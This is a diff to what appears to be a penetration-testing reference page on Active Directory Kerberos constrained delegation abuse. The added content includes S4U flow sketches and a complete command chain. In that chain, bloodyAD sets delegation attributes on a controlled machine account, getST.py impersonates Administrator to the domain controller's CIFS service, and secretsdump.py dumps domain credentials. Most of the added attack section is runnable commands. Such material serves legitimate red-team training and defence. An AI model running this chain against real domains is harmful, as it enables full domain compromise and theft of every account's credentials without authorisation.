@@ -12,9 +12,21 @@ Two Kerberos extensions underpin all constrained delegation abuse:
   <img src="/images/active-directory/delegation/s4u-flow.png" alt="S4U2Self and S4U2Proxy authentication flow diagram" />
 </Frame>
 
-**S4U2Self (Service-for-User-to-Self):** Allows a service to request a forwardable service ticket to itself on behalf of any user, without that user's password or prior authentication. Requires the account to have an SPN.
+**S4U2Self (Service-for-User-to-Self):** Allows a service to request a forwardable service ticket to itself on behalf of any user, without that user's password or prior authentication. Requires the account to have an SPN and `TRUSTED_TO_AUTH_FOR_DELEGATION` set.
 
-**S4U2Proxy (Service-for-User-to-Proxy):** Allows a service to use a forwardable TGS (obtained from S4U2Self or a real user auth) to request a ticket to a third service. On classic constrained delegation, the KDC validates the target SPN against `msDS-AllowedToDelegateTo`. On RBCD, the KDC validates the source against `msDS-AllowedToActOnBehalfOfOtherIdentity` on the target.
+```
+KANYO$ → KDC: "give me a service ticket for KANYO$ as Administrator"
+KDC    → checks TRUSTED_TO_AUTH_FOR_DELEGATION on KANYO$
+KDC    → issues ticket: "Administrator authenticated to KANYO$"
+```
+
+**S4U2Proxy (Service-for-User-to-Proxy):** Allows a service to use a forwardable TGS (from S4U2Self or a real user auth) to request a ticket to a third service. On classic constrained delegation, the KDC validates the target SPN against `msDS-AllowedToDelegateTo`. On RBCD, it validates the source against `msDS-AllowedToActOnBehalfOfOtherIdentity` on the target.
+
+```
+KANYO$ → KDC: "use this ticket to get cifs/DC1 as Administrator"
+KDC    → checks msDS-AllowedToDelegateTo → sees cifs/DC1 is allowed
+KDC    → issues: "Administrator's ticket for cifs/DC1"
+```
 
 <Frame caption="How unconstrained and constrained delegation appear in Active Directory Users and Computers (Delegation tab)">
   <img src="/images/active-directory/delegation/showcase-delegation.png" alt="Windows AD delegation tab showing unconstrained and constrained delegation options" />
@@ -31,14 +43,46 @@ Every AD object has a `userAccountControl` bitmask controlling account behaviour
 | `524288` | `TRUSTED_FOR_DELEGATION` | Unconstrained delegation enabled |
 | `528384` | `4096 + 524288` | Machine account with unconstrained delegation |
 | `16777216` | `TRUSTED_TO_AUTH_FOR_DELEGATION` | Protocol transition (T2A4D) |
+| `16781312` | `4096 + 16777216` | Machine account with protocol transition (constrained delegation) |
 
 ```bash wrap
 # Set unconstrained delegation on a machine account you control
 bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST \
   set object '$COMP_NAME' userAccountControl -v 528384
+
+# Set constrained delegation (protocol transition) on a machine account
+bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST \
+  set object '$COMP_NAME' userAccountControl -v 16781312
 ```
 
-**SeEnableDelegationPrivilege:** Normally only Domain Admins can set delegation flags. This privilege grants that ability to non-admin accounts. If a low-priv user has it, they can set `TRUSTED_FOR_DELEGATION` on any account they control, without DA.
+### SeEnableDelegationPrivilege
+
+Normally only Domain Admins can set delegation flags. This privilege grants that ability to non-admin accounts. If a low-priv user has it, they can configure delegation on any account they control without DA — then immediately exploit it.
+
+```
+N.Thompson has SeEnableDelegationPrivilege
+  → Sets msDS-AllowedToDelegateTo = [cifs/dc1.domain.local] on KANYO$
+  → Sets userAccountControl = 16781312 on KANYO$ (T2A4D + workstation)
+  → Runs getST.py as KANYO$ to impersonate Administrator to cifs/DC1
+  → DCSync
+```
+
+```bash wrap
+# Grant KANYO$ constrained delegation to cifs/DC1
+bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST \
+  set object '$COMP_NAME' msDS-AllowedToDelegateTo -v "cifs/$DC_HOST"
+
+# Enable protocol transition (T2A4D) on KANYO$ so S4U2Self works
+bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST \
+  set object '$COMP_NAME' userAccountControl -v 16781312
+
+# Impersonate Administrator to cifs/DC1 in one step
+getST.py -spn "cifs/$DC_HOST" -impersonate Administrator \
+  -dc-ip $DC_IP "$DOMAIN/$COMP_NAME:$COMP_PASS"
+
+export KRB5CCNAME="Administrator@cifs_$DC_HOST@${DOMAIN^^}.ccache"
+secretsdump.py -k -no-pass $DC_HOST
+```
 
 ---
 
@@ -305,6 +349,18 @@ ntlmrelayx.py -t ldap://$DC_HOST --delegate-access --escalate-user '$COMP_NAME$'
 
 ---
 
+## Unconstrained vs Constrained
+
+| | Unconstrained | Constrained |
+|--|---------------|-------------|
+| **Approach** | Passive: wait for coercion | Active: request ticket yourself |
+| **Coercion needed** | Yes (PetitPotam, printerbug) | No |
+| **Setup** | DNS record + SPN on compromised host | `msDS-AllowedToDelegateTo` |
+| **What you get** | Full TGT of the victim | Forwardable service ticket |
+| **Scope** | Any service in the domain | Only the configured SPNs |
+
+---
+
 ## Protections
 
 | Protection | Effect |
@@ -322,5 +378,8 @@ ntlmrelayx.py -t ldap://$DC_HOST --delegate-access --escalate-user '$COMP_NAME$'
   </Card>
   <Card title="The Most Dangerous User Right You've Never Heard Of" icon="link" href="https://blog.harmj0y.net/activedirectory/the-most-dangerous-user-right-you-probably-have-never-heard-of/">
     harmj0y on SeEnableDelegationPrivilege: why it matters, how to find it, and what an attacker can do with it
+  </Card>
+  <Card title="Kerberos Delegations - The Hacker Recipes" icon="link" href="https://www.thehacker.recipes/ad/movement/kerberos/delegations/">
+    Comprehensive delegation reference covering unconstrained, constrained, and RBCD with attack chains and tooling
   </Card>
 </CardGroup>
